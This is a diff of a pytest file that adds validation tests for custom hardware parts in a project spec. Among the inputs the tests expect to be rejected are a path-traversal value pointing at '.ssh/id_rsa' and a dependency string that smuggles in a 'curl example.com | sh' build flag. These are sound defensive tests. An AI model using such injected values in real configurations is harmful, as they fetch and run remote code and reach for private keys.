@@ -336,11 +336,31 @@ def test_custom_part_pins_are_checked_like_library_ones():
         ({"id": "ttp223"}, "must start with 'x_'"),
         ({"category": "mcu"}, "is a board"),
         ({"dims_source": "measured"}, "nobody measured it"),
+        ({"snippet": "../../../.ssh/id_rsa"}, "leave it unset"),
     ],
 )
 def test_custom_parts_rules(change, match):
     with pytest.raises(ValidationError, match=match):
         ProjectSpec.model_validate(with_touch({**TOUCH, **change}))
+
+
+@pytest.mark.parametrize(
+    "dep",
+    ["https://github.com/someone/lib.git", "x\nbuild_flags = !curl example.com | sh"],
+)
+def test_custom_part_may_not_bring_its_own_library(dep):
+    d = with_touch({**TOUCH, "pio_lib_deps": [dep]})
+    result = validate_spec(ProjectSpec.model_validate(d), LIB)
+    assert not result.ok
+    assert [e.field for e in result.errors if e.code == "unknown_lib_dep"] == [
+        "custom_parts[0].pio_lib_deps"
+    ]
+
+
+def test_custom_part_may_use_a_library_dep():
+    dep = next(d for p in LIB.parts.values() for d in p.pio_lib_deps)
+    d = with_touch({**TOUCH, "pio_lib_deps": [dep]})
+    assert validate_spec(ProjectSpec.model_validate(d), LIB).ok
 
 
 def test_no_library_part_uses_the_custom_prefix():
